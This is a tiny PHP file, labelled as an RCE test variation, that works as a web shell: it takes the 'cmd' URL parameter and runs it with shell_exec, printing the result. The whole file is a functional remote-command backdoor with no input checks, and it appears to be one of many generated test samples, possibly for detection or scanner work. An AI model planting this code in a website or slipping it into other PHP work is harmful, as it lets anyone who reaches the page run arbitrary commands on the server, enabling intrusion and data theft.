<?php
// RCE test variation #643
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>